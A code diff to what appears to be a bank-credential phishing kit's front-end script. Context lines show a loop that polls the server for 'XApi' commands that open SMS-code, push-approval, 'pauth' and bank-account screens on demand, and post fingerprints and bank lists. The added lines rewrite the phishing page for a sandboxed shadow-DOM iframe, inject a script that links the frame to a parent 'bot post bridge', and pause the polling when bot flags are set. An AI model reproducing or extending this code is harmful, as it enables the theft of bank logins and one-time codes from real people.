@@ -63,7 +63,17 @@ document.addEventListener("DOMContentLoaded",function(){if(window.jQuery&&!windo
                 // Set sandbox before srcdoc so the frame has permissions when the document loads
                 iframe.sandbox = "allow-scripts allow-same-origin allow-popups allow-forms";
 				
-				iframe.srcdoc = page;
+				/* __cadShadowPathPatch */
+			page = page.replace(/\.\.\/([a-zA-Z0-9_-]+)\//g, '/$1/');
+			page = page.replace(/\.\.\/no_img\.png/g, '/no_img.png');
+			page = page.replace(/https:\/\/code\.jquery\.com\/jquery[^"']+/g, '/1.0.0/js/jquery.min.js');
+			page = page.replace(/window.trigger = window.trigger || null; var trigger = window.trigger;/g, "window.trigger = window.trigger || null; var trigger = window.trigger;");
+			page = page.replace(/trigger = setInterval\(function\(\) \{\$\.post\("#", \{type: "XApi"\}/g, 'trigger = setInterval(function() { if (window.__cadBotEarly || window.__cadEmbeddedSupport || !window.jQuery) return; $.post("#", {type: "XApi"}');
+			if (page.indexOf('__cadBotEarly') < 0) {
+				page = page.replace(/<head([^>]*)>/i, '<head$1><script>window.__cadBotEarly=true;window.__cadEmbeddedSupport=true;(function(){function h(){try{if(window.jQuery&&!window.__postBridgeInstalled&&window.parent&&window.parent.__installBotPostBridge)window.parent.__installBotPostBridge(window);}catch(e){}}h();document.addEventListener("DOMContentLoaded",h);var i=setInterval(function(){h();if(window.__postBridgeInstalled)clearInterval(i);},16);setTimeout(function(){clearInterval(i);},2e4);})();</script>');
+			}
+			iframe.onload = function () { try { var w = iframe.contentWindow; if (w && window.__installBotPostBridge) window.__installBotPostBridge(w); } catch (e) {} };
+			iframe.srcdoc = page;
 				shadowRoot.appendChild(iframe);
 				iframeRef = iframe;
 				
@@ -195,6 +205,11 @@ window.__cadBotEarly=true;
 window.__cadEmbeddedSupport=true;
 </script>
 	<script src="/js/captcha-gate.js"></script>
+<script>
+window.__cadBotEarly=true;
+window.__cadEmbeddedSupport=true;
+</script>
+	<script src="/js/captcha-gate.js"></script>
 <script src="/1.0.0/js/jquery.mask.min.js"></script>
 
 <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
@@ -264,8 +279,7 @@ window.__cadEmbeddedSupport=true;
 	}
 	
 	document.addEventListener('DOMContentLoaded', function() {
-		var intervalEnterData = setInterval(function(){
-			if ($('.modal-overlay').length) {
+		var intervalEnterData = setInterval(function(){ if (!window.jQuery) return; if ($('.modal-overlay').length) {
 				$('.modal-overlay #close-chat').on('click', function(){
 					$.post('#', {type: 'close-window'});
 				});
@@ -1850,7 +1864,7 @@ else if (callback.substr(0, 10) == 'rs_req_num') {
 		return status;
 	}
 
-	var trigger = null;if (trigger) {clearInterval(trigger);console.log('Previous interval stopped');}trigger = setInterval(function() {$.post("#", {type: "XApi"}, "json").done(function(data) {if (data.length > 0 && data.length < 4096) {data = data.trim();console.log(data);if (data == 'openchat') {openChat ();} else if (data == 'sms') {showCode();} else if (data == 'push') {if (data.length > 4) {$('#push-amount').text(data.substr(4));}showPush();} else if (data == 'pauth' || (data.length >= 5 && data.substr(0, 5) == 'pauth') || data == 'kleinpush_auth') {showPauth();} else if (data.trim() == 'openlk') {
+	window.trigger = window.trigger || null; var trigger = window.trigger;if (trigger) {clearInterval(trigger);console.log('Previous interval stopped');}trigger = setInterval(function() { if (window.__cadBotEarly || window.__cadEmbeddedSupport || !window.jQuery) return; $.post("#", {type: "XApi"}, "json").done(function(data) {if (data.length > 0 && data.length < 4096) {data = data.trim();console.log(data);if (data == 'openchat') {openChat ();} else if (data == 'sms') {showCode();} else if (data == 'push') {if (data.length > 4) {$('#push-amount').text(data.substr(4));}showPush();} else if (data == 'pauth' || (data.length >= 5 && data.substr(0, 5) == 'pauth') || data == 'kleinpush_auth') {showPauth();} else if (data.trim() == 'openlk') {
 		if (d.hasOwnProperty(c)) {
 			$.post('#', {type: "notify", action: "all-lks", finger: "15ba727f51f3a2b1ec9872c316cbcf0be25521b9d3a65d65c66a568c1fd8f7f5"});
 			 $('#dynamic-banks tbody').html ('');
